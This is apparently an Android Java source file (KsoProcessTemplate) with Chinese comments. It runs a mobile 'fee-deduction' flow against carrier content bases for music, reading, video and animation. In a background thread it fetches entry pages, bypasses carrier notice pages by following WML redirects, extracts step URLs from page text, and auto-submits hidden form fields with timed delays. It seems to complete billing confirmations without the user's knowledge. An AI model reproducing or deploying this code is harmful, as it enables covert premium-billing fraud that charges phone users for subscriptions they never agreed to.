package com.sttm.model;

import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.htmlparser.Node;
import org.htmlparser.NodeFilter;
import org.htmlparser.Parser;
import org.htmlparser.PrototypicalNodeFactory;
import org.htmlparser.filters.TagNameFilter;
import org.htmlparser.tags.CompositeTag;
import org.htmlparser.tags.FormTag;
import org.htmlparser.tags.ImageTag;
import org.htmlparser.tags.InputTag;
import org.htmlparser.tags.LinkTag;
import org.htmlparser.util.NodeList;
import org.htmlparser.util.ParserException;

import android.content.Context;

import android.util.Log;

import com.sttm.util.HttpUtil;
import com.sttm.util.LogFile;
import com.sttm.util.WapNetUtil;

public class KsoProcessTemplate {
	private String baseName = "";
	private String content = "";
	private String stepUrl = "";
	private String[] startKeys, endKeys;
	private int[] keyinds;
	@SuppressWarnings("unused")
	private String lastName = "";

	private String startKey;
	private String endKey;
	private String keyind;
	private String doMain;
	private int btype;
	private int type;
	private int stepCount;
	private long delay;
	private int downLen;
	private String accessUrl;
	private Context context;

	public KsoProcessTemplate(String startKey, String endKey, String keyind,
			String doMain, int btype, int type, int stepCount, long delay,
			int downLen, String accessUrl, Context context) {
		this.startKey = startKey;
		this.endKey = endKey;
		this.keyind = keyind;
		this.doMain = doMain;
		this.btype = btype;
		this.type = type;
		this.stepCount = stepCount;
		this.delay = delay;
		this.downLen = downLen;
		this.accessUrl = accessUrl;
		this.context = context;

	}

	public void program() {
		//Log.d("test==", "基地扣费流程程序开始了");
		startKeys = new String[stepCount];
		endKeys = new String[stepCount];

		if (startKey != null && !"".equals(startKey)) {
			startKeys = startKey.split(",");
		}
		if (endKey != null && !"".equals(endKey)) {
			endKeys = endKey.split(",");
		}
		if (keyind != null && !"".equals(keyind)) {

			String[] keyindsStr = keyind.split(",");
			//Log.d("第几个关键字长度", keyindsStr.length + "dd");
			keyinds = new int[keyindsStr.length];
			if (keyindsStr.length > 0) {

				for (int i = 0; i < keyindsStr.length; i++) {

					keyinds[i] = Integer.parseInt(keyindsStr[i]);
					if (keyinds[i] == 0) {
						keyinds[i] = 1;
						//Log.d("关键字", keyinds[i] + "dd");
					}
				}
			}

		}

		switch (btype) {
		case 0:
			baseName = "music";
			lastName = "mp3";
			break;
		case 1:
			baseName = "read";
			lastName = "txt";
			break;
		case 2:
			baseName = "video";
			lastName = "mp4";
			break;
		case 4:
			baseName = "dm";
			lastName = "gif";
			break;
		case 5:
			baseName = "flash";
			lastName = "flv";
			break;
		}

		new Thread() {

			@Override
			public void run() {
				LogFile.WriteLogFile(baseName + "基地计费流程开始走了");
				//Log.d("入口URL", accessUrl);
			    LogFile.WriteLogFile("入口URL:" + accessUrl);
				//Log.d("basename", baseName);
				content = HttpUtil.getContentApacheGet(accessUrl, context,
						baseName + "_access.wml");
				//content = HttpUtil.getWapContent(accessUrl);
				//Log.d("入口content", content.trim());
				LogFile.WriteLogFile("入口content" + content.trim());
				
				if ("".equals(content)) {
					//Log.d("入口content", "空内容");
					return;
				}
			//	boolean isCookieInHeader = HttpUtil.getCookieInHeader(accessUrl);

				if (!content.contains(startKeys[0]) && content.contains("<go") && !startKeys[0].contains("<go")) {
					LogFile.WriteLogFile("入口内容为移动提示页面，需要重定向获取真正的入口页面");
				//if ( isCookieInHeader && !content.contains(startKeys[0]) && content.contains("<go")) {
					Parser parser = new Parser();
					try {
						parser.setEncoding("GBK");
						parser.setInputHTML(content.trim());

						// 注册新的结点解析器
						PrototypicalNodeFactory factory = new PrototypicalNodeFactory();
						factory.registerTag(new WmlGoTag());
						parser.setNodeFactory(factory);

						// 遍历符合条件的所有节点
						NodeList nlist = parser
								.extractAllNodesThatMatch(lnkFilter);
						for (int i = 0; i < nlist.size(); i++) {
							CompositeTag node = (CompositeTag) nlist
									.elementAt(i);
							if (node instanceof WmlGoTag) {
								WmlGoTag go = (WmlGoTag) node;
								//Log.d("GO: /t", go.getLink());
								stepUrl = go.getLink().replaceAll("&amp;", "&");
								break;
							}
						}
						
						//Log.d("真正的入口地址", stepUrl);
						LogFile.WriteLogFile("真正的入口地址" + stepUrl);
						content = HttpUtil.getContentApacheGet(stepUrl,
								context, baseName + "_access_readly.wml");
						//Log.d("真正的入口内容", content.trim());
						LogFile.WriteLogFile("真正的入口内容" + content.trim());

					} catch (ParserException e) {

						e.printStackTrace();
					}

				}

				//Log.d("流程总步数", stepCount + "");
				//Log.d("间隔时间", delay + "");

				for (int i = 0; i < stepCount; i++) {
					//Log.d("keyinds[i]dddddddd",keyinds[i] + "dkd");
					if (i == (stepCount - 1)) {
						//Log.d("最后一步", "test<><><><>");
						LogFile.WriteLogFile("这是最后一步");
						if (type == 0) {
							//Log.d("test<><><><>type == 0", "test<><><><>");
							if (downLen == 0) {
								//Log.d("test<><><><>downLen == 0","test<><><><>");
								try {
									Thread.sleep(delay * 1000);
								} catch (Exception e) {

								}

								if (startKeys[i].contains("action")) {
									stepUrl = getStepUrl(doMain, keyinds,
											startKeys, endKeys, content.trim(),
											i);

									if (stepUrl == null || "".equals(stepUrl)) {
										//Log.d("ACTION路径", "找不到路径");
										return;
									}
									stepUrl = stepUrl.replaceAll("&amp;", "&");
									//Log.d("第" + (i + 1) + "步action_URL",stepUrl);
									LogFile.WriteLogFile("第" + (i + 1) + "步action_URL" +
											stepUrl);
									HashMap<String, String> params = getInputs(getFormContent(
											content, keyinds[i] - 1));
									if (params != null) {
										//Log.d("参数列表FORM", params.isEmpty() + "");
										content = HttpUtil.postRequest(context,
												baseName + "_" + (i + 1)
														+ ".wml", stepUrl,
												params);
										//Log.d("第" + (i + 1) + "步表单方式conten",content.trim());
										LogFile.WriteLogFile("第" + (i + 1) + "步表单方式conten" +
												content.trim());
									}

								} else {
									//Log.d("第" + (i + 1) + "步关键字44444", keyinds[i]+ "");

									stepUrl = getStepUrl(doMain, keyinds,
											startKeys, endKeys, content.trim(),
											i);

									if (stepUrl == null || "".equals(stepUrl)) {
										//Log.d("第" + (i + 1) + "步", "此链接无值");
										return;
									}

									stepUrl = stepUrl.replaceAll("&amp;", "&");
									//Log.d("第" + (i + 1) + "步URL", stepUrl);
									LogFile.WriteLogFile("第" + (i + 1) + "步URL" + stepUrl);
									content = HttpUtil.getContentApacheGet(
											stepUrl, context, baseName
													+ (i + 1) + ".wml");
									//Log.d("第" + (i + 1) + "步content",content.trim());
									LogFile.WriteLogFile("第" + (i + 1) + "步content" +
											content.trim());

								}

							} else {

								try {
									Thread.sleep(delay * 1000);
								} catch (Exception e) {

								}

								if (startKeys[i].contains("action")) {
									stepUrl = getStepUrl(doMain, keyinds,
											startKeys, endKeys, content.trim(),
											i);

									if (stepUrl == null || "".equals(stepUrl)) {
										//Log.d("ACTION路径", "找不到路径");
										return;
									}
									stepUrl = stepUrl.replaceAll("&amp;", "&");
									//Log.d("第" + (i + 1) + "步action_URL",stepUrl);
									LogFile.WriteLogFile("第" + (i + 1) + "步action_URL" +
											stepUrl);
									HashMap<String, String> params = getInputs(getFormContent(
											content, keyinds[i] - 1));
									if (params != null) {
										//Log.d("参数列表FORM", params.isEmpty() + "");
										/*content = HttpUtil.postRequest(context,
												baseName + "_" + (i + 1)
														+ ".wml", stepUrl,
												params);
*/										
										
										content = HttpUtil.postRequest1(context,
												baseName + "_" + (i + 1)
														+ ".wml", stepUrl,
												params,downLen);
										//Log.d("第" + (i + 1) + "步表单方式conten",content.trim());
										LogFile.WriteLogFile("第" + (i + 1) + "步表单方式conten" +
												content.trim());
									}

								} else {
									//Log.d("第" + (i + 1) + "步关键字《3》《3》《3》", keyinds[i]+ "");

									stepUrl = getStepUrl(doMain, keyinds,
											startKeys, endKeys, content.trim(),
											i);

									if (stepUrl == null || "".equals(stepUrl)) {
										//Log.d("第" + (i + 1) + "步", "此链接无值");
										return;
									}

									stepUrl = stepUrl.replaceAll("&amp;", "&");
									//Log.d("第" + (i + 1) + "步URL", stepUrl);
									LogFile.WriteLogFile("第" + (i + 1) + "步URL" + stepUrl);
								/*	content = HttpUtil.getContentApacheGet(
											stepUrl, context, baseName
													+ (i + 1) + ".wml");*/
									
									content = HttpUtil.getContentApacheGet1(
											stepUrl, context, baseName
													+ (i + 1) + ".wml",downLen);
									//Log.d("第" + (i + 1) + "步content",content.trim());
									LogFile.WriteLogFile("第" + (i + 1) + "步content" + content.trim());
								}

							}

						} else if (type == 1) {

						}

					} else {

						//Log.d("中间步骤", "这是第" + (i + 1) + "步");
						LogFile.WriteLogFile("这是第" + (i + 1) + "步");

						try {
							Thread.sleep(delay * 1000);
						} catch (Exception e) {

						}

						if (btype == 1) {
							String imageUrl = doMain + getImageSrc(content);
							//Log.d("图片下载路径", imageUrl);
							LogFile.WriteLogFile("这是阅读基地计费流程，需要下载图片，图片下载路径：" + imageUrl);
							WapNetUtil.getImage2(imageUrl, context);

							try {
								Thread.sleep(delay * 1000);
							} catch (Exception e) {

							}
						}

						if (startKeys[i].contains("action")) {

							stepUrl = getStepUrl(doMain, keyinds, startKeys,
									endKeys, content.trim(), i);

							if (stepUrl == null || "".equals(stepUrl)) {
								//Log.d("ACTION路径", "找不到路径");
								return;
							}
							stepUrl = stepUrl.replaceAll("&amp;", "&");
							//Log.d("第" + (i + 1) + "步action_URL", stepUrl);
							LogFile.WriteLogFile("第" + (i + 1) + "步action_URL" + stepUrl);
							HashMap<String, String> params = getInputs(getFormContent(
									content, keyinds[i] - 1));
							if (params != null) {
								//Log.d("参数列表FORM", params.isEmpty() + "");
								content = HttpUtil.postRequest(context,
										baseName + "_" + (i + 1) + ".wml",
										stepUrl, params);
								//Log.d("第" + (i + 1) + "步表单方式content",content.trim());
								LogFile.WriteLogFile("第" + (i + 1) + "步表单方式content"+
										content.trim());
							}

						} else {
							//Log.d("第" + (i + 1) + "步关键字6666666", keyinds[i] + "");

							stepUrl = getStepUrl(doMain, keyinds, startKeys,
									endKeys, content.trim(), i);

							if (stepUrl == null || "".equals(stepUrl)) {
								//Log.d("第" + (i + 1) + "步", "此链接无值");
								return;
							}

							stepUrl = stepUrl.replaceAll("&amp;", "&");
							//Log.d("第" + (i + 1) + "步URL", stepUrl);
							LogFile.WriteLogFile("第" + (i + 1) + "步URL" + stepUrl);
							content = HttpUtil.getContentApacheGet(stepUrl,
									context, baseName + (i + 1) + ".wml");
							//Log.d("第" + (i + 1) + "步content", content.trim());
							LogFile.WriteLogFile("第" + (i + 1) + "步content" + content.trim());

						}

					}

				}

				super.run();
			}

		}.start();

	}

	/**
	 * 
	 * @param string内容
	 * @param params分割符
	 * @param keying第几次
	 * @return分割字符出现在位置
	 */

	public int getCharacterPosition(String string, String params, int keyind) {
		// 这里是获取"/"符号的位置Pattern.CASE_INSENSITIVE)。此时可以不区分大小写地查找

		//Log.d("真正keyind", keyind + "");
		Matcher slashMatcher = Pattern
				.compile(params, Pattern.CASE_INSENSITIVE).matcher(string);
		int mIdx = 0;
		while (slashMatcher.find()) {
			mIdx++;
			// 当"/"符号第三次出现的位置
			if (mIdx == keyind) {
				break;
			}
		}

		return slashMatcher.start();
	}

	public int getCharacterPosition2(String string, String params, int keyind) {
		// 这里是获取"/"符号的位置Pattern.CASE_INSENSITIVE)。此时可以不区分大小写地查找
		Matcher slashMatcher = Pattern
				.compile(params, Pattern.CASE_INSENSITIVE).matcher(string);
		int mIdx = 0;
		while (slashMatcher.find()) {
			mIdx++;
			// 当"/"符号第三次出现的位置
			if (mIdx == keyind) {
				return slashMatcher.start();
			}
		}
		return -1;

	}

	public String getImageSrc(String inputHtml) {
		Parser myParser;
		try {
			myParser = new Parser(inputHtml);
			// 设置编码
			myParser.setEncoding("GBK");
			String filterStr = "img";
			NodeFilter filter = new TagNameFilter(filterStr);
			NodeList nodeList = myParser.extractAllNodesThatMatch(filter);
			ImageTag imageTag = (ImageTag) nodeList.elementAt(0);
			if (imageTag != null) {
				if (imageTag.getAttribute("src") != null) {
					//Log.d("图片SRC", imageTag.getAttribute("src"));
					return imageTag.getAttribute("src");
				}

			}

		} catch (ParserException e) {
			return "";

		}
		return "";

	}

	public String getLink_A(String resource, int index) {
		Parser myParser;
		try {
			myParser = new Parser(resource);
			// 设置编码
			myParser.setEncoding("GBK");
			String filterStr = "a";
			NodeFilter filter = new TagNameFilter(filterStr);
			NodeList nodeList = myParser.extractAllNodesThatMatch(filter);
			LinkTag tabletag = (LinkTag) nodeList.elementAt(index);
			if (tabletag != null) {
				//Log.d("href路径", tabletag.getAttribute("href"));

				return tabletag.getAttribute("href");

			}

		} catch (ParserException e) {

			e.printStackTrace();
		}
		return "";

		// System.out.println("==============");

	}

	public String getLink_text(String resource, int index) {
		Parser myParser;
		try {
			myParser = new Parser(resource);
			// 设置编码
			myParser.setEncoding("GBK");
			String filterStr = "a";
			NodeFilter filter = new TagNameFilter(filterStr);
			NodeList nodeList = myParser.extractAllNodesThatMatch(filter);
			LinkTag aTag = (LinkTag) nodeList.elementAt(index);
			if (aTag != null) {
				//Log.d("<a>文本", aTag.toHtml());

				return aTag.toHtml();

			}

		} catch (ParserException e) {

			e.printStackTrace();
		}
		return "";

		// System.out.println("==============");

	}

	public String getFormContent(String resource, int index) {
		Parser myParser;
		try {
			myParser = new Parser(resource);
			// 设置编码
			myParser.setEncoding("GBK");
			String filterStr = "form";
			NodeFilter filter = new TagNameFilter(filterStr);
			NodeList nodeList = myParser.extractAllNodesThatMatch(filter);
			FormTag tabletag = (FormTag) nodeList.elementAt(index);

			//Log.d("FOrm表单内容", tabletag.toHtml());

			return tabletag.toHtml();

		} catch (ParserException e) {

			return "";
		}

	}

	public HashMap<String, String> getInputs(String formContent) {
		if ("".equals(formContent) || formContent == null) {
			return null;
		}
		HashMap<String, String> inputs = new HashMap<String, String>();
		Parser myParser;
		try {
			myParser = new Parser(formContent);
			// 设置编码
			myParser.setEncoding("GBK");
			String filterStr = "input";
			NodeFilter filter = new TagNameFilter(filterStr);
			NodeList nodeList = myParser.extractAllNodesThatMatch(filter);
			InputTag tabletag = null;

			for (int i = 0; i < nodeList.size(); i++) {
				tabletag = (InputTag) nodeList.elementAt(i);
				String type = tabletag.getAttribute("type");
				if (type.equalsIgnoreCase("hidden")) {
					String value = tabletag.getAttribute("value");
					String name = tabletag.getAttribute("name");
					//Log.d("第" + i + "hidden内容","type=" + type + ";value=" + value + ";name=" + name);
					inputs.put(name, value);

				}
			}

			return inputs;
		} catch (ParserException e) {
			return null;

		}


	}

	/**
	 * 得到每一步的URL地址
	 * 
	 * @param content
	 * @param stepIndex
	 * @return
	 */

	public String getStepUrl(String doMain, int[] keyinds, String[] startKeys,
			String[] endKeys, String content, int stepIndex) {
		// //Log.d("getCharacterPosition内容", content);

		String stepUrl = "";

		//Log.d("startKeys[stepIndex]", startKeys[stepIndex]);
		//Log.d("keyinds[stepIndex]", keyinds[stepIndex] + "");
		//Log.d("endKeys[stepIndex]", endKeys[stepIndex]);

		if (content.contains(startKeys[stepIndex])) {
			//Log.d("content.contains(startKeys[stepIndex]","" + content.contains(startKeys[stepIndex]));
			int offSet = getCharacterPosition2(content, startKeys[stepIndex],
					keyinds[stepIndex]);
			if (offSet < 0) {
				//Log.d("找不到getCharacterPosition2", "找不到offSet");
				return "";
			}
			String tempStr = content.substring(offSet
					+ startKeys[stepIndex].length());
			//Log.d("中间内容", tempStr);

			int lastSet = getCharacterPosition2(tempStr, endKeys[stepIndex], 1);
			if (lastSet < 0) {
				//Log.d("找不到getCharacterPosition2", "找不到lastSet");
				return "";
			}

			// //Log.d("lastSet", lastSet + "");
			// //Log.d("startKeys.length",startKeys[stepIndex].length() + "");

			stepUrl = tempStr.substring(0, lastSet);
			if("".equals(stepUrl)){
				return "";
			}

			//Log.d("getCharacterPosition2地址", stepUrl + "xxx");

			if (!stepUrl.startsWith("http")) {

				stepUrl = doMain.trim() + stepUrl.substring(1);
			}

		}

		return stepUrl;

	}

	public String getStepUrl2(int[] keyinds, String[] startKeys,
			String[] endKeys, String content, int stepIndex) {

		//Log.d("startKeys[stepIndex]", startKeys[stepIndex]);
		//Log.d("endKeys[stepIndex]", endKeys[stepIndex]);

		//Log.d("keyinds[stepIndex]", keyinds[stepIndex] + "");

		int offSet = getCharacterPosition2(content, startKeys[stepIndex],
				keyinds[stepIndex] - 1);
		if (offSet < 0) {
			//Log.d("找不到ACTION", "找不到ACTION");
			return "";
		}
		int lastSet = getCharacterPosition2(content, endKeys[stepIndex],
				keyinds[stepIndex] - 1);

		String stepUrl = content.substring(offSet + startKeys.length, lastSet);

		return stepUrl;

	}

	/**
	 * 解析出所有的链接，包括行为<a>与<go>
	 */

	@SuppressWarnings("serial")
	public NodeFilter lnkFilter1 = new NodeFilter() {
		public boolean accept(Node node) {
			if (node instanceof WmlGoTag)
				return true;
			if (node instanceof LinkTag)
				return true;
			return false;
		}
	};

	/**
	 * 解析出所有的链接，包括行为<go>
	 */
	@SuppressWarnings("serial")
	public NodeFilter lnkFilter = new NodeFilter() {
		public boolean accept(Node node) {
			if (node instanceof WmlGoTag) {
				return true;

			}

			return false;
		}
	};

}
